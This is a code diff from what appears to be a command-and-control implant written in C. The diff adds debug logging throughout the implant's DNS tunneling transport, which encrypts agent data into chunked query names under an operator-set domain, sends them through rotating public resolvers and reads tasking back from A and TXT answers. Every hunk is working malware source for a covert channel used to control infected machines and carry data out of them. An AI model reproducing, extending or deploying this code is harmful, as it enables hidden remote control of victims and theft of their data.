@@ -644,15 +644,23 @@ BOOL QuerySingle(
 
     if ( ! Instance->Win32.sendto || ! Instance->Win32.recvfrom ||
          ! Instance->Win32.select || ! Instance->Win32.socket ||
-         ! Instance->Win32.gethostbyname || ! Instance->Win32.closesocket )
+         ! Instance->Win32.closesocket )
+    {
+        PRINTF( "[DNS] Error: Missing Win32 API pointers in QuerySingle\n%s", "" );
         return FALSE;
+    }
 
     if ( ! Resolver || ! Resolver[ 0 ] )
         return FALSE;
 
+    PRINTF( "[DNS] Ensuring WSA...\n%s", "" );
     if ( ! DnsEnsureWsa() )
+    {
+        PRINTF( "[DNS] Error: DnsEnsureWsa failed\n%s", "" );
         return FALSE;
+    }
 
+    PRINTF( "[DNS] Building wire query for %s...\n%s", Qname, "" );
     if ( ! BuildDnsWireQuery( Qname, QtypeString, Query, sizeof( Query ), &QueryLength ) )
         return FALSE;
 
@@ -662,12 +670,20 @@ BOOL QuerySingle(
     Address.sin_addr.s_addr = htonl( DnsParseIpV4( Resolver ) );
 
     if ( Address.sin_addr.s_addr == INADDR_NONE || Address.sin_addr.s_addr == 0 )
+    {
+        PRINTF( "[DNS] Error: Failed to parse IP %s\n%s", Resolver, "" );
         return FALSE;
+    }
 
+    PRINTF( "[DNS] Creating socket...\n%s", "" );
     SocketFd = Instance->Win32.socket( AF_INET, SOCK_DGRAM, IPPROTO_UDP );
     if ( SocketFd == INVALID_SOCKET )
+    {
+        PRINTF( "[DNS] Error: socket() failed\n%s", "" );
         return FALSE;
+    }
 
+    PRINTF( "[DNS] Sending UDP packet (%lu bytes) to %s...\n%s", QueryLength, Resolver, "" );
     Result = Instance->Win32.sendto(
         SocketFd,
         ( const char* ) Query,
@@ -679,6 +695,7 @@ BOOL QuerySingle(
 
     if ( Result != ( int ) QueryLength )
     {
+        PRINTF( "[DNS] Error: sendto() failed\n%s", "" );
         Instance->Win32.closesocket( SocketFd );
         return FALSE;
     }
@@ -689,13 +706,16 @@ BOOL QuerySingle(
     Timeout.tv_sec = DNS_QUERY_TIMEOUT;
     Timeout.tv_usec = 0;
 
+    PRINTF( "[DNS] Waiting for response (select)...\n%s", "" );
     Result = Instance->Win32.select( 0, &ReadSet, NULL, NULL, &Timeout );
     if ( Result <= 0 )
     {
+        PRINTF( "[DNS] Error: select() timeout or error (%d)\n%s", Result, "" );
         Instance->Win32.closesocket( SocketFd );
         return FALSE;
     }
 
+    PRINTF( "[DNS] Received data! Calling recvfrom...\n%s", "" );
     AddressLength = ( int ) sizeof( Address );
 
     Received = ( ULONG ) Instance->Win32.recvfrom(
@@ -985,13 +1005,18 @@ static BOOL DnsQueryWithRotation(
         if ( DnsResolverDisabledUntil[ Index ] && DnsGetTickCount() < DnsResolverDisabledUntil[ Index ] )
             continue;
 
+        PRINTF( "[DNS] Trying plain resolver: %s\n%s", DnsResolverList[ Index ], "" );
+
         if ( QuerySingle( Qname, DnsResolverList[ Index ], QtypeString, OutBuffer, OutBufferSize, OutSize ) )
         {
+            PRINTF( "[DNS] QuerySingle SUCCEEDED\n%s", "" );
             DnsCurrentResolver = Index;
             DnsResolverFailCount[ Index ] = 0;
             DnsResolverDisabledUntil[ Index ] = 0;
             return TRUE;
         }
+
+        PRINTF( "[DNS] QuerySingle FAILED for resolver %s\n%s", DnsResolverList[ Index ], "" );
 
         DnsResolverFailCount[ Index ]++;
 
@@ -1039,8 +1064,13 @@ static BOOL DnsInitialize(
     if ( DnsInitialized )
         return TRUE;
 
+    PRINTF( "[DNS] Initializing Dns...\n%s", "" );
+
     if ( ! Instance->Config.Transport.Domain )
+    {
+        PRINTF( "[DNS] Error: Transport.Domain is NULL\n%s", "" );
         return FALSE;
+    }
 
     WCharStringToCharString( DnsDomain, Instance->Config.Transport.Domain, sizeof( DnsDomain ) );
 
@@ -1052,7 +1082,12 @@ static BOOL DnsInitialize(
     }
 
     if ( ! DnsDomain[ 0 ] )
+    {
+        PRINTF( "[DNS] Error: Domain string is empty\n%s", "" );
         return FALSE;
+    }
+
+    PRINTF( "[DNS] Parsed Domain: %s\n%s", DnsDomain, "" );
 
     MemCopy( DnsEncryptKey, Instance->Config.Transport.EncryptKey, DNS_KEY_LENGTH );
 
@@ -1088,6 +1123,8 @@ static BOOL DnsInitialize(
         StringCopyA( DnsResolverList[ 0 ], "8.8.8.8" );
         DnsResolverCount = 1;
     }
+
+    PRINTF( "[DNS] Resolver Count: %lu\n%s", DnsResolverCount, "" );
 
     for ( INT i = 7; i >= 0; i-- )
         DnsSessionId[ 7 - i ] = DnsHexDigits[ ( Instance->Session.AgentID >> ( i * 4 ) ) & 0xF ];
@@ -1244,9 +1281,16 @@ static BOOL DnsUpload(
     ULONG  Retries = 0;
     BOOL   IsPut = StringCompareA( Op, "cdn" ) == 0;
 
+    PRINTF( "[DNS] DnsUpload start. Op: %s, Length: %lu\n%s", Op, Length, "" );
+
     Capacity = DnsChunkCapacity();
     if ( ! Capacity )
+    {
+        PRINTF( "[DNS] Error: DnsChunkCapacity returned 0\n%s", "" );
         return FALSE;
+    }
+
+    PRINTF( "[DNS] DnsUpload chunk capacity: %lu\n%s", Capacity, "" );
 
     if ( Length == 0 )
         return FALSE;
@@ -1277,18 +1321,22 @@ static BOOL DnsUpload(
         Frame = NULL;
 
         if ( ! DnsBuildQueryName( DnsSessionId, Op, ++DnsSequence, "0", Labels, DnsDomain, QueryName, sizeof( QueryName ) ) )
+        {
+            PRINTF( "[DNS] Error: DnsBuildQueryName failed\n%s", "" );
             return FALSE;
+        }
+
+        PRINTF( "[DNS] Built Query Name: %s\n%s", QueryName, "" );
 
         AnswerSize = 0;
 
         if ( ! DnsQueryWithRotation( QueryName, IsPut ? "A" : "TXT", Answer, sizeof( Answer ), &AnswerSize ) )
         {
-            if ( IsPut )
-                return FALSE;
-
-            /* the registration packet is retried on the next exchange */
+            PRINTF( "[DNS] Error: DnsQueryWithRotation failed\n%s", "" );
             return FALSE;
         }
+
+        PRINTF( "[DNS] Query succeeded! AnswerSize: %lu\n%s", AnswerSize, "" );
 
         if ( ! IsPut )
         {
